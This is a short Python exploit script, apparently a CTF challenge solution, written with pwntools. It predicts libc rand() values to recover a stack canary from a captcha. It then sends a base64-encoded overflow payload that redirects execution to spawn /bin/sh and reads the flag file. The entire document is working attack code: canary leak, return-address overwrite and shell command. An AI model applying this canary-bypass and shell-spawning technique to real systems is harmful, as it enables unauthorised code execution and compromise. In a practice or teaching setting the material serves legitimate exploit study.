from pwn import *
import ctypes
from ctypes.util import find_library

libc_path = find_library('c')
print(f"Discovered path: {libc_path}") 
libc = ctypes.CDLL(libc_path)

libc.srand(libc.time(0))
r = []
for _ in range(8):
    r.append(libc.rand())

# Captcha = all_except_canary + canary
all_except_canary = r[1]+r[5]+r[2]-r[3]+r[7]+r[4]-r[6]

p = remote('0',10018)

p.recvuntil(b'Are you human? input captcha :')
captcha = int(p.recvline(keepends=False).decode())
canary = captcha - all_except_canary
canary &= 0xffffffff
print(f'{captcha=} {canary=}')

p.sendline(b'%d' % captcha)
payload = b'A'*512 + p32(canary) + b'A'*12 + p32(0x08049187) + p32(0x804b3ac)
payload = b64e(payload).encode()
p.sendline(payload + b'/bin/sh\0')
p.sendlineafter(b'MD5(data) :', b'cat flag')

print('[FLAG]', p.recvlines(2)[1].decode())
p.close()